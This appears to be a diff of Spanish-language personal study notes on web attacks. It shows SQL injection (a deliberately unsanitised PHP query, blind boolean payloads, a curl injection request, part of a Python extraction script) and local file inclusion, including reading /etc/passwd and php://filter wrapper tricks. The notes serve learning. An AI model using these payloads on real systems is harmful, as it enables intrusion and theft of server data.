@@ -1,6 +1,8 @@
-1. [[SQLI]]
-	query desde php a la db para mostrar el nombre del usuario por su id(no sanitizada)
-	```php
+# 1. [[SQLI]]
+
+query desde php a la db para mostrar el nombre del usuario por su id(no sanitizada)
+		
+```php
 	<?php
   $server = "localhost";
   $username = "luka";
@@ -16,25 +18,28 @@
 
   echo $response["username"];
 ?>
-	```
-	usando la clausula **ORDER BY *3*** se puede averiguar el nro de columnas en la tabla
-	-- - para comentar el resto de la query
+```
 
-	ejemplo inyeccion booleana:
-	```sql
+usando la clausula **ORDER BY *3*** se puede averiguar el nro de columnas en la tabla
+-- - para comentar el resto de la query
+
+ejemplo inyeccion booleana:
+	
+```sql
 	select(select substring(username,1,1) from user where id='1')='a'
-	```
-	pero esta query podria dar problemas por las comillas, entonces se recomienda usar ASCII
-	```sql
+```
+	
+pero esta query podria dar problemas por las comillas, entonces se recomienda usar ASCII
+```sql
 	select(select ascii(substring(username,1,1)) from user where id='1')=97;
-	```
+```
 
-	comando curl con parametro de url data
+comando curl con parametro de url data
 	```bash
-	curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlenconde "id=2 or '1'='1'"
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlenconde "id=2 or '1'='1'"
 	```
 	
-	```python
+```python
 	#!/usr/bin/python3
 
 import requests
@@ -79,7 +84,7 @@ def makeSQLI():
 
 if __name__ == "__main__":
     makeSQLI()
-	```
+```
 **`characters`**: Una lista de todos los caracteres imprimibles que se usarán para comparar con los datos de la base de datos.
 ##### Lógica Principal: El ataque de Fuerza Bruta
 
@@ -350,3 +355,15 @@ php -r 'if(substr(argv[1],-6,6)!="passwd") include(argv[1]);' '/etc/passwd'; ech
 ```
 pero se puede ver archivos igualmente utilizando '/etc/passwd\\.'
 
+wrapper de php por ejemplo -> php://filter/convert.base64-encode/resource=index.php. se debe poder ver el codigo fuente
+
+Wrapper def:
+son funciones que envuelven otras operaciones para controlarlas, y aunque son herramientas legítimas para funciones como la lectura de archivos o streams, se vuelven **vulnerabilidades críticas** cuando son mal configuradas o usadas por atacantes, permitiendo **[lectura de código fuente (LFI), ejecución remota de código (RCE)](https://www.google.com/search?client=firefox-b-d&q=lectura+de+c%C3%B3digo+fuente+%28LFI%29%2C+ejecuci%C3%B3n+remota+de+c%C3%B3digo+%28RCE%29&ved=2ahUKEwi6lLGi3peSAxWIRlUIHTWyH8oQgK4QegQIARAB), o eludir restricciones de acceso** para ver archivos sensibles del servidor, como `/etc/passwd` o archivos de configuración.
+
+wrapper con los caracterese rotados 13 posiciones
+?filename=php://filter/read=string.rot13/resource=secret.php
+
+al convertir una cadena de base64 usando //filter/convert.iconv.UTF8.CSISO2022KR
+y al volverla a decodear en base 64 lo que pasa es que se agrega un nuevo caracter al principio de la cadena principal, entonces la idea es agregar caracteres especificos para lograr formar un comando en la terminal
+
+# 5. [[RFI]] (remote file inclusion)
